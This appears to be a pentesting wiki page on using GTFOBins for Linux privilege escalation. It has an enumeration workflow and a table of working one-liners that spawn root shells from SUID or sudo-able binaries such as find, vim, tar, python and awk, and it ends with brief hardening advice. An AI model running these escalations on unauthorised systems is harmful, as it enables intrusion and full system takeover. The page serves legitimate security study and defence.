# GTFOBins (Linux)

- **What it is:** a curated list of standard Linux/Unix binaries that can be abused to break out of a restricted context — bypass local security, escalate via **SUID** or **sudo**, read/write files as another user, or get a shell.
- **Site:** https://gtfobins.github.io
- **When to use it:** after enumeration (see [Linux privesc](Linux.md)) you find a binary that is **SUID** or that you can run via **sudo**. Look it up on GTFOBins for the exact escalation.

## The workflow
```bash
# 1) Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
# 2) See what you can run as root via sudo
sudo -l
# 3) Look the binary up on gtfobins.github.io for the "SUID" or "Sudo" section
```

## Representative examples
These are the kinds of one-liners GTFOBins documents. Always confirm the exact syntax on the site for your binary and version.

| Binary | If SUID / sudo-able → escalation idea |
| --- | --- |
| `find` | `find . -exec /bin/sh -p \; -quit` (`-p` keeps the SUID privileges) |
| `vim` | `vim -c ':!/bin/sh'` — shell out from the editor |
| `less` / `more` | `!/bin/sh` from the pager prompt |
| `nmap` | interactive mode on old versions: `--interactive` then `!sh` |
| `python` | `python -c 'import os;os.setuid(0);os.system("/bin/sh")'` |
| `tar` | `tar -cf /dev/null x --checkpoint=1 --checkpoint-action=exec=/bin/sh` |
| `awk` | `awk 'BEGIN{system("/bin/sh")}'` |
| `cp` / `tee` | write to `/etc/passwd` or a root cron — file-write primitive |

> `-p` on `find`, `bash`, etc. preserves the effective UID so a SUID-root binary spawns a **root** shell rather than dropping privileges.

## Defender view
- Minimise SUID binaries (`find / -perm -4000` and justify each one).
- Keep `sudoers` tight — no `NOPASSWD` on interpreters, editors, or archivers.
- The Windows equivalent is **[LOLBAS](LOLBAS.md)**.
